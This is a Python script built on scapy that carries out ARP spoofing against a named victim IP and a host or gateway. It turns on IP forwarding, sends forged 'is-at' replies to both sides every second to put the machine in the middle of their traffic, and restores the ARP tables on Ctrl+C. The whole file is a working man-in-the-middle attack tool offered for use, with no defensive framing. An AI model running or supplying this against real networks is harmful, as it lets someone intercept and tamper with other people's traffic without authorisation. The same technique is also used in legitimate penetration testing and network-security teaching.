from scapy.all import srp, send
from scapy.layers.l2 import ARP, Ether
import argparse
import time
import os
import sys


# for unix-like users
def _enable_linux_iproute():
    """
    enables IP route (ip forward) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)


# for windows users
def _enable_windows_iproute():
    """
     enables IP route (ip forwarding) in windows
    """
    from services import WService
    # enable Remote Access service
    service = WService("RemoteAccess")
    service.start()


# for all users
def enable_ip_route(verbose=True):
    """
    enables IP Forwarding
    """
    if verbose:
        print("[!] Enabling IP Routing...")
    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")


# get MAC address of any machine connected to network
def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


def spoof(target_ip, host_ip, verbose=True):
    # get the mac address of the target
    target_mac = get_mac(target_ip)

    # craft the arp 'is-at' operation packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')

    # send the packet
    send(arp_response, verbose=0)
    if verbose:
        # get the mac address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))


# restore normal process of regular network
def restore(target_ip, host_ip, verbose=True):
    # get real mac address of target
    target_mac = get_mac(target_ip)

    # get real mac address of spoofed (gateway, router)
    host_mac = get_mac(host_ip)

    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)

    # sending the restoring packet
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP spoof script")
    parser.add_argument("target", help="Victim IP address to ARP poision")
    parser.add_argument("host", help="Host IP address, the host you wish to intercept packets for")
    parser.add_argument("-v", "--verbose", action="store_true", help="verbosity, default is True")
    args = parser.parse_args()
    target, host, verbose = args.target, args.host, args.verbose

    """
    #hard-code spoofing
    # victim ip address
    target = "127.0.0.1"
    # gateway ip address
    host = "127.0.0.1"
    # print progress to the screen
    verbose = True
    """

    # enable ip forwarding
    enable_ip_route()
    try:
        while True:
            # telling the 'target' that we are the 'host'
            spoof(target, host, verbose)
            # telling the 'host' that we are the 'target'
            spoof(host, target, verbose)
            # sleep for 1 second
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C! restoring the network, please wait...")
        restore(target, host)
        restore(host, target)
